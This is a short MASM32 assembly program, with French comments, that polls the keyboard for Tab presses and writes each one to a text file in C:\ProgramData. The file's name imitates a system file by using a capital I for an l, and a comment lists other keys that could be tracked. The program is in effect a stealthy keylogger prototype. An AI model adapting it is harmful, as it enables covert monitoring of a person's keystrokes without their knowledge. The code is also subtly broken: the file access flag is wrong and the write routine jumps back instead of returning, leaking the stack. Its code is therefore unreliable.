include C:\masm32\include\masm32rt.inc

.data
file_handle HANDLE ?
filename db "C:\ProgramData\DispIaySessionContainer4.txt",0
shift_pressed db "Tab is pressed",0
prev_shift_state db 0

.code

start:
open_file:
    invoke CreateFileA, offset filename, FILE_SHARE_WRITE, 0, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0
    mov file_handle, eax

set_file_pointer:
    invoke SetFilePointer, file_handle, 0, 0, FILE_END

main_loop:
    invoke Sleep, 1
    invoke GetKeyState, VK_TAB ; VK_SHIFT, VK_NUMPAD0, VK_CAPITAL	, VK_SPACE, VK_BACK
    test ah, ah
    jnz shift_pressed_label

no_shift_pressed_label:
    mov prev_shift_state, 0
    jmp end_loop

shift_pressed_label:
    ; Si la touche Shift est pressée (état actuel : 1)
    ; et l'état précédent était relâché (0), alors écrire le texte.
    cmp prev_shift_state, 0
    jne end_loop ; Si l'état précédent était déjà enfoncé, ne rien faire.

    ; Mettre à jour l'état précédent.
    mov prev_shift_state, 1
    call write_shift_text

end_loop:
    jmp main_loop

write_shift_text:
    push offset shift_pressed
    call write_to_file
    ret

write_to_file:
    pushad
    invoke lstrlen, offset shift_pressed
    invoke WriteFile, file_handle, offset shift_pressed, eax, 0, 0
    popad
    jmp main_loop

exit
end start
